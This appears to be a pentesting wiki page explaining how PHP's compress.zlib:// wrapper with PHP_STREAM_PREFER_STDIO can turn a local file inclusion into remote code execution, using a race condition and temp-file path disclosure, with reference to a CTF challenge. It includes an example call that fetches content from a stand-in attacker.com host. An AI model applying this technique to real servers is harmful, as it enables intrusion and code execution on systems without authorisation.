# LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure

{{#include ../../banners/hacktricks-training.md}}

### `compress.zlib://` and `PHP_STREAM_PREFER_STDIO`

A file opened using the protocol `compress.zlib://` with the flag `PHP_STREAM_PREFER_STDIO` can continue writing data that arrives to the connection later to the same file.

This means that a call such as:

```php
file_get_contents("compress.zlib://http://attacker.com/file")
```

Will send a request asking for http://attacker.com/file, then the server might respond the request with a valid HTTP response, keep the connection open, and send extra data some time later that will be also written into the file.

You can see that info in this part of the php-src code in main/streams/cast.c:

```c
/* Use a tmpfile and copy the old streams contents into it */

    if (flags & PHP_STREAM_PREFER_STDIO) {
        *newstream = php_stream_fopen_tmpfile();
    } else {
        *newstream = php_stream_temp_new();
    }
```

### Race Condition to RCE

[**This CTF**](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer) was solved using the previous trick.

The attacker will make the **victim server open a connection reading a file from the attackers server** using the **`compress.zlib`** protocol.

**While** this **connection** exist the attacker will **exfiltrate the path** to the temp file created (it's leaked by the server).

**While** the **connection** is still open, the attacker will **exploit a LFI loading the temp file** that he controls.

However, there is a check in the web server that **prevents loading files that contains `<?`**. Therefore, the attacker will abuse a **Race Condition**. In the connection that is still open the **attacker** will **send the PHP payload AFTER** the **webserver** has **checked** if the file contains the forbidden characters but **BEFORE it loads its content**.

For more information check the description of the Race Condition and the CTF in [https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer)

{{#include ../../banners/hacktricks-training.md}}



